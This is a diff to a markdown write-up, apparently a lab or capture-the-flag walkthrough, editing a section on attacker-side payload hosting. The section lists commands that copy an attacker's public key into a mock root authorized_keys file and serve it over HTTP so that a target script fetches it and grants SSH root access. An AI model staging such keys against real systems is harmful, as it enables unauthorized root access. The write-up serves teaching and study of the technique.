@@ -2153,17 +2153,15 @@ root_key  root_key.pub
 
 #### 5.2.2 Payload Hosting & Directory Mocking (Attacker Side)
 
-The `install_validator.py` script expects a URL. To ensure the Python web server correctly served the file when the target requested a specific path, we reconstructed that path locally.
-
 **Commands:** `mkdir -p ./root/.ssh/` `cp root_key.pub ./root/.ssh/authorized_keys` `python3 -m http.server 80` or you could run it all as: `mkdir -p ./root/.ssh/ && cp root_key.pub ./root/.ssh/authorized_keys && python3 -m http.server 80`
 
-**Breakdown:**
+`mkdir -p ./root/.ssh/`: Creates the nested folder structure. The `-p` flag ensures parent directories are created if they don't exist.
 
-- `mkdir -p ./root/.ssh/`: Creates the nested folder structure. The `-p` flag ensures parent directories are created if they don't exist.
+
     
-- `cp root_key.pub ...`: Renames and moves the public key to `authorized_keys`, the specific filename the SSH daemon looks for to grant access.
+    `cp root_key.pub ...`: Renames and moves the public key to `authorized_keys`, the specific filename the SSH daemon looks for to grant access.
     
-- `python3 -m http.server 80`: Launches a lightweight web server on port 80 to host the "fake" root directory.
+    `python3 -m http.server 80`: Launches a lightweight web server on port 80 to host the "fake" root directory.
 <div align="center">
 <br>
 <br>
